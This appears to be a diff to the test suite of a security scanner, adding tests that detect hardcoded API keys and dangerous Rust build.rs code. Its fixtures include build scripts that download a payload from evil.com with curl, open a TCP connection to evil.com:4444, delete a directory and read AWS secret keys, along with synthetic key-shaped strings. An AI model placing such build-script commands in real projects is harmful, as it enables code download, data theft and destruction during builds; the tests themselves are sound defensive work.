@@ -376,10 +376,232 @@ class TestPromptInjection:
 
 
 # ──────────────────────────────────────────────
-# 7. Full Auto-Scan Integration
+# 7. Hardcoded Secret / API Key Detection (P0-1)
 # ──────────────────────────────────────────────
 
-class TestAutoScan:
+class TestHardcodedSecrets:
+    """P0-1: Hardcoded credential detection across 8 provider formats."""
+
+    # ── check_hardcoded_secrets (single file) ──
+
+    def test_clean_file_no_secrets(self, tmp_dir, checker):
+        (tmp_dir / "main.py").write_text('api_key = os.environ["ANTHROPIC_API_KEY"]\n')
+        issues = checker.check_hardcoded_secrets(tmp_dir / "main.py")
+        assert issues == []
+
+    def test_anthropic_key_detected(self, tmp_dir, checker):
+        # Real Anthropic key format: sk-ant-api03-<93 chars>
+        key = "sk-ant-api03-" + "A" * 93
+        (tmp_dir / "config.py").write_text(f'ANTHROPIC_KEY = "{key}"\n')
+        issues = checker.check_hardcoded_secrets(tmp_dir / "config.py")
+        assert any(i['rule_id'] == 'SECRET-001' for i in issues)
+        assert all(i['severity'] == 'CRITICAL' for i in issues)
+
+    def test_openai_key_detected(self, tmp_dir, checker):
+        key = "sk-proj-" + "B" * 48
+        (tmp_dir / "settings.py").write_text(f'OPENAI_KEY = "{key}"\n')
+        issues = checker.check_hardcoded_secrets(tmp_dir / "settings.py")
+        assert any(i['rule_id'] == 'SECRET-002' for i in issues)
+
+    def test_aws_access_key_detected(self, tmp_dir, checker):
+        # AKIAIOSFODNN7EXAMPLE is the AWS documentation key (has 'example') — use a
+        # realistic-looking key that does not trigger the false-positive filter
+        (tmp_dir / "deploy.sh").write_text('AWS_ACCESS_KEY_ID=AKIAJ4ZPUJLGZUKQLRJQ\n')
+        issues = checker.check_hardcoded_secrets(tmp_dir / "deploy.sh")
+        assert any(i['rule_id'] == 'SECRET-003' for i in issues)
+
+    def test_github_pat_detected(self, tmp_dir, checker):
+        key = "ghp_" + "C" * 36
+        (tmp_dir / ".env").write_text(f'GITHUB_TOKEN={key}\n')
+        issues = checker.check_hardcoded_secrets(tmp_dir / ".env")
+        assert any(i['rule_id'] == 'SECRET-004' for i in issues)
+
+    def test_slack_token_detected(self, tmp_dir, checker):
+        key = "xoxb-123456789012-123456789012-" + "D" * 24
+        (tmp_dir / "bot.js").write_text(f'const token = "{key}";\n')
+        issues = checker.check_hardcoded_secrets(tmp_dir / "bot.js")
+        assert any(i['rule_id'] == 'SECRET-006' for i in issues)
+
+    def test_google_api_key_detected(self, tmp_dir, checker):
+        key = "AIza" + "E" * 35
+        (tmp_dir / "app.ts").write_text(f'const API_KEY = "{key}";\n')
+        issues = checker.check_hardcoded_secrets(tmp_dir / "app.ts")
+        assert any(i['rule_id'] == 'SECRET-007' for i in issues)
+
+    def test_huggingface_token_detected(self, tmp_dir, checker):
+        key = "hf_" + "F" * 34
+        (tmp_dir / "model.py").write_text(f'token = "{key}"\n')
+        issues = checker.check_hardcoded_secrets(tmp_dir / "model.py")
+        assert any(i['rule_id'] == 'SECRET-008' for i in issues)
+        assert any(i['severity'] == 'WARNING' for i in issues)
+
+    def test_placeholder_not_flagged(self, tmp_dir, checker):
+        # xxxx-style placeholder should be ignored
+        (tmp_dir / "README.md").write_text(
+            'Set ANTHROPIC_KEY=sk-ant-api03-xxxxxxxxxxxx\n'
+        )
+        issues = checker.check_hardcoded_secrets(tmp_dir / "README.md")
+        assert issues == []
+
+    def test_example_file_skipped(self, tmp_dir, checker):
+        key = "sk-ant-api03-" + "A" * 93
+        p = tmp_dir / "config.example.py"
+        p.write_text(f'ANTHROPIC_KEY = "{key}"\n')
+        issues = checker.check_hardcoded_secrets(p)
+        assert issues == []
+
+    def test_secret_redacted_in_output(self, tmp_dir, checker):
+        # Use alternating chars so no FP indicator substring is present
+        key = "sk-ant-api03-" + "Kp3" * 31  # 93 chars, no placeholder pattern
+        (tmp_dir / "app.py").write_text(f'KEY = "{key}"\n')
+        issues = checker.check_hardcoded_secrets(tmp_dir / "app.py")
+        assert len(issues) > 0
+        # The full key must NOT appear in output
+        content = issues[0]['content']
+        assert key not in content
+        assert '...' in content  # redacted form
+
+    # ── scan_for_secrets (whole directory) ──
+
+    def test_scan_finds_key_in_nested_file(self, tmp_dir, checker):
+        subdir = tmp_dir / "src" / "config"
+        subdir.mkdir(parents=True)
+        key = "sk-ant-api03-" + "G" * 93
+        (subdir / "secrets.py").write_text(f'KEY = "{key}"\n')
+        issues = checker.scan_for_secrets(tmp_dir)
+        assert any(i['rule_id'] == 'SECRET-001' for i in issues)
+
+    def test_scan_skips_node_modules(self, tmp_dir, checker):
+        nm = tmp_dir / "node_modules" / "some-pkg"
+        nm.mkdir(parents=True)
+        key = "sk-ant-api03-" + "H" * 93
+        (nm / "index.js").write_text(f'var k = "{key}";\n')
+        issues = checker.scan_for_secrets(tmp_dir)
+        # Should not find the key inside node_modules
+        assert not any(i['rule_id'] == 'SECRET-001' for i in issues)
+
+    def test_scan_detects_dotenv_secrets(self, tmp_dir, checker):
+        key = "AKIAJ4ZPUJLGZUKQLRJQ"  # realistic 20-char AWS key format, no FP indicators
+        (tmp_dir / ".env").write_text(f'AWS_ACCESS_KEY_ID={key}\n')
+        issues = checker.scan_for_secrets(tmp_dir)
+        assert any(i['rule_id'] == 'SECRET-003' for i in issues)
+
+
+# ──────────────────────────────────────────────
+# 8. Rust build.rs Compile-time Execution (P0-2)
+# ──────────────────────────────────────────────
+
+class TestBuildRs:
+    """P0-2: Rust build.rs dangerous compile-time operation detection."""
+
+    def test_clean_build_rs(self, tmp_dir, checker):
+        content = '''
+fn main() {
+    println!("cargo:rerun-if-changed=build.rs");
+    println!("cargo:rustc-cfg=feature=\\"default\\"");
+}
+'''
+        (tmp_dir / "build.rs").write_text(content)
+        issues = checker.check_build_rs(tmp_dir / "build.rs")
+        assert issues == []
+
+    def test_curl_in_build_rs_is_critical(self, tmp_dir, checker):
+        content = '''
+fn main() {
+    std::process::Command::new("curl")
+        .args(&["https://evil.com/payload", "-o", "/tmp/x"])
+        .output().unwrap();
+}
+'''
+        (tmp_dir / "build.rs").write_text(content)
+        issues = checker.check_build_rs(tmp_dir / "build.rs")
+        assert any(i['severity'] == 'CRITICAL' for i in issues)
+        assert any(i['rule_id'] == 'SUPPLY-022' for i in issues)
+
+    def test_tcp_connection_in_build_rs(self, tmp_dir, checker):
+        content = '''
+use std::net::TcpStream;
+fn main() {
+    let stream = TcpStream::connect("evil.com:4444").unwrap();
+}
+'''
+        (tmp_dir / "build.rs").write_text(content)
+        issues = checker.check_build_rs(tmp_dir / "build.rs")
+        assert any('TcpStream' in str(i) or 'tcp' in str(i).lower() for i in issues)
+        assert any(i['severity'] == 'CRITICAL' for i in issues)
+
+    def test_file_deletion_in_build_rs(self, tmp_dir, checker):
+        content = '''
+fn main() {
+    std::fs::remove_dir_all("/important/path").unwrap();
+}
+'''
+        (tmp_dir / "build.rs").write_text(content)
+        issues = checker.check_build_rs(tmp_dir / "build.rs")
+        assert any(i['severity'] == 'CRITICAL' for i in issues)
+
+    def test_http_client_import_warning(self, tmp_dir, checker):
+        content = '''
+extern crate reqwest;
+fn main() {
+    println!("cargo:rerun-if-changed=build.rs");
+}
+'''
+        (tmp_dir / "build.rs").write_text(content)
+        issues = checker.check_build_rs(tmp_dir / "build.rs")
+        assert any('reqwest' in str(i).lower() or 'http' in str(i).lower() for i in issues)
+
+    def test_sensitive_env_var_read(self, tmp_dir, checker):
+        content = '''
+fn main() {
+    let secret = std::env::var("AWS_SECRET_ACCESS_KEY").unwrap();
+}
+'''
+        (tmp_dir / "build.rs").write_text(content)
+        issues = checker.check_build_rs(tmp_dir / "build.rs")
+        assert any('SECRET' in str(i).upper() or 'env' in str(i).lower() for i in issues)
+
+    def test_comment_lines_not_flagged(self, tmp_dir, checker):
+        content = '''
+fn main() {
+    // Command::new("curl") -- disabled
+    println!("cargo:rerun-if-changed=build.rs");
+}
+'''
+        (tmp_dir / "build.rs").write_text(content)
+        issues = checker.check_build_rs(tmp_dir / "build.rs")
+        # Commented-out curl should not trigger CRITICAL
+        critical = [i for i in issues if i['severity'] == 'CRITICAL']
+        assert critical == []
+
+    def test_proc_macro_with_build_rs_escalation(self, tmp_dir, checker):
+        build_rs = '''
+fn main() {
+    std::process::Command::new("curl")
+        .arg("https://evil.com").output().unwrap();
+}
+'''
+        cargo_toml = '''
+[package]
+name = "evil-macro"
+version = "0.1.0"
+
+[lib]
+proc-macro = true
+'''
+        (tmp_dir / "build.rs").write_text(build_rs)
+        (tmp_dir / "Cargo.toml").write_text(cargo_toml)
+        issues = checker.check_build_rs(tmp_dir / "build.rs")
+        rule_ids = [i['rule_id'] for i in issues]
+        assert 'SUPPLY-022' in rule_ids
+        assert 'SUPPLY-023' in rule_ids  # escalation flag
+
+
+# ──────────────────────────────────────────────
+# 9. Full Auto-Scan Integration
+# ──────────────────────────────────────────────
+
+class TestAutoScan:  # was section 7, renumbered to 9
     def test_scan_returns_dict(self, tmp_dir, scanner):
         result = scanner.auto_scan(str(tmp_dir))
         assert isinstance(result, dict)
